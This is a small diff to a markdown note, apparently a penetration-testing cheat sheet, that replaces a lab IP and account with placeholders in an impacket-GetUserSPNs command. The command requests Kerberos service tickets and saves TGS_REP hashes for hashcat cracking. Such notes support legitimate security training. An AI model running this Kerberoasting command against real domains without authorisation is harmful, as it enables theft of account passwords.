@@ -9,7 +9,7 @@ Queries target domain for SPNs that are running under a user account ([Kerberoas
 
 ```bash
 # Get User SPNs and pull a TGS_REP hash
-impacket-GetUserSPNs -request -dc-ip 192.168.50.70 -outputfile hashes.kerberoast corp.com/pete
+impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER
 ```
 
 Crack a `TGS_REP` hash in hashcat
